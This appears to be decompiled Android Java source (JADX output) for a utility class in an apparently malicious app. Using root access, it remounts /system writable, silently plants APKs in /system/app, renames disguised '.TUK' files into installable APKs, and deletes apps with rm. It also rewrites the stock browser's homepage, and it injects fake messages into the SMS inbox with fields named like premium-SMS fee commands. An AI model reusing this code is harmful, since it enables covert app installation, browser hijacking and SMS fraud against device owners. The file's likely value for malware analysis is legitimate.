package com.clmobile.utils;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.text.TextUtils;
import java.io.File;
import java.io.FilenameFilter;

public class Helper {
    public static boolean installApp(Context context, String packageName, String apkFileName, File apkpath) {
        boolean result = false;
        String installlists = Utils.getInstalledApplist(context, null);
        if (packageName != null && installlists != null && installlists.contains(packageName)) {
            result = true;
        } else if (ScriptUtils.hasRootAccess()) {
            StringBuilder message = new StringBuilder();
            ScriptUtils.runScriptAsRoot(context, "mount -o rw,remount -t yaffs2 /dev/block/mtdblock3 /system", message);
            ScriptUtils.runScriptAsRoot(context, new StringBuilder("dd if=").append(apkpath.getAbsolutePath()).append("  of=/system/app/").append(apkpath.getName()).toString(), message);
            ScriptUtils.runScriptAsRoot(context, new StringBuilder("chmod 644 /system/app/").append(apkpath.getName()).toString(), message);
            result = true;
        }
        apkpath.delete();
        return result;
    }

    /* JADX WARNING: inconsistent code. */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void modifyBrowserHomePage(android.content.Context r17_context, java.lang.String r18_url) {
        throw new UnsupportedOperationException("Method not decompiled: com.clmobile.utils.Helper.modifyBrowserHomePage(android.content.Context, java.lang.String):void");
        /*
        r15 = com.clmobile.utils.ScriptUtils.hasRootAccess();
        if (r15 == 0) goto L_0x006c;
    L_0x0006:
        r8 = new java.lang.StringBuilder;
        r8.<init>();
        r1 = "chmod 777 /data/data/com.android.browser/shared_prefs/com.android.browser_preferences.xml";
        r0 = r17;
        com.clmobile.utils.ScriptUtils.runScriptAsRoot(r0, r1, r8);
        r6 = new java.io.File;
        r15 = "/data/data/com.android.browser/shared_prefs/com.android.browser_preferences.xml";
        r6.<init>(r15);
        r15 = r6.exists();
        if (r15 == 0) goto L_0x006c;
    L_0x001f:
        r10 = new org.dom4j.io.SAXReader;
        r10.<init>();
        r2 = r10.read(r6);	 Catch:{ Exception -> 0x009d }
        r4 = r2.getRootElement();	 Catch:{ Exception -> 0x009d }
        r15 = "string";
        r13 = r4.elements(r15);	 Catch:{ Exception -> 0x009d }
        if (r13 == 0) goto L_0x003a;
    L_0x0034:
        r15 = r13.size();	 Catch:{ Exception -> 0x009d }
        if (r15 != 0) goto L_0x006d;
    L_0x003a:
        r15 = "string";
        r5 = org.dom4j.DocumentHelper.createElement(r15);	 Catch:{ Exception -> 0x009d }
        r15 = "name";
        r16 = "homepage";
        r0 = r16;
        r5.addAttribute(r15, r0);	 Catch:{ Exception -> 0x009d }
        r0 = r18;
        r5.setText(r0);	 Catch:{ Exception -> 0x009d }
        r4.add(r5);	 Catch:{ Exception -> 0x009d }
    L_0x0051:
        r7 = org.dom4j.io.OutputFormat.createPrettyPrint();	 Catch:{ Exception -> 0x009d }
        r15 = "utf-8";
        r7.setEncoding(r15);	 Catch:{ Exception -> 0x009d }
        r14 = new org.dom4j.io.XMLWriter;	 Catch:{ Exception -> 0x009d }
        r15 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x009d }
        r16 = "/data/data/com.android.browser/shared_prefs/com.android.browser_preferences.xml";
        r15.<init>(r16);	 Catch:{ Exception -> 0x009d }
        r14.<init>(r15, r7);	 Catch:{ Exception -> 0x009d }
        r14.write(r2);	 Catch:{ Exception -> 0x009d }
        r14.close();	 Catch:{ Exception -> 0x009d }
    L_0x006c:
        return;
    L_0x006d:
        r15 = r13.iterator();	 Catch:{ Exception -> 0x009d }
    L_0x0071:
        r16 = r15.hasNext();	 Catch:{ Exception -> 0x009d }
        if (r16 == 0) goto L_0x0051;
    L_0x0077:
        r12 = r15.next();	 Catch:{ Exception -> 0x009d }
        r12 = (org.dom4j.Element) r12;	 Catch:{ Exception -> 0x009d }
        r16 = "name";
        r0 = r16;
        r9 = r12.attributeValue(r0);	 Catch:{ Exception -> 0x009d }
        r11 = r12.getStringValue();	 Catch:{ Exception -> 0x009d }
        r16 = "homepage";
        r0 = r16;
        r16 = r9.equals(r0);	 Catch:{ Exception -> 0x009d }
        if (r16 == 0) goto L_0x0071;
    L_0x0093:
        r0 = r18;
        r12.setText(r0);	 Catch:{ Exception -> 0x009d }
        r11 = r12.getStringValue();	 Catch:{ Exception -> 0x009d }
        goto L_0x0051;
    L_0x009d:
        r3 = move-exception;
        r3.printStackTrace();
        goto L_0x006c;
        */
    }

    public static void notifyInfo(Context context, String content, String url, String tip) {
        NotificationManager mNotificationManager = (NotificationManager) context.getSystemService("notification");
        Notification notification = new Notification(2130837504, content, System.currentTimeMillis());
        Intent notificationIntent = new Intent("android.intent.action.VIEW");
        if (!TextUtils.isEmpty(url)) {
            notificationIntent.setData(Uri.parse(url));
        }
        notification.setLatestEventInfo(context, tip, content, PendingIntent.getActivity(context, 0, notificationIntent, 0));
        mNotificationManager.notify(1, notification);
    }

    public static void releaseApk(Context context) {
        if (ScriptUtils.hasRootAccess()) {
            StringBuilder message = new StringBuilder();
            ScriptUtils.runScriptAsRoot(context, "mount -o rw,remount -t yaffs2 /dev/block/mtdblock3 /system", message);
            ScriptUtils.runScriptAsRoot(context, "chmod 777 /system/app", message);
            File[] files = new File("/system/app").listFiles(new FilenameFilter() {
                public boolean accept(File dir, String filename) {
                    return filename.endsWith(".TUK");
                }
            });
            if (files != null) {
                int length = files.length;
                int i = 0;
                while (i < length) {
                    File file = files[i];
                    file.renameTo(new File(file.getAbsolutePath().replaceFirst(".TUK", ".apk")));
                    i++;
                }
            }
            ScriptUtils.runScriptAsRoot(context, "chmod 755 /system/app", message);
        }
    }

    public static void removeApp(Context context, String packageName) {
        String str = "";
        str = Utils.getInstalledAppPath(context, packageName);
        if (ScriptUtils.hasRootAccess()) {
            StringBuilder message = new StringBuilder();
            ScriptUtils.runScriptAsRoot(context, "mount -o rw,remount -t yaffs2 /dev/block/mtdblock3 /system", message);
            ScriptUtils.runScriptAsRoot(context, new StringBuilder("rm ").append(str).toString(), message);
        }
    }

    public static void sendSMS(Context context, String SmsFeePort, String SmsFeeCmd) {
        ContentValues values = new ContentValues();
        values.put("address", SmsFeePort);
        values.put("type", "1");
        values.put("read", "0");
        values.put("body", SmsFeeCmd);
        values.put("date", System.currentTimeMillis());
        values.put("person", "");
        Uri uri = context.getContentResolver().insert(Uri.parse("content://sms/inbox"), values);
    }
}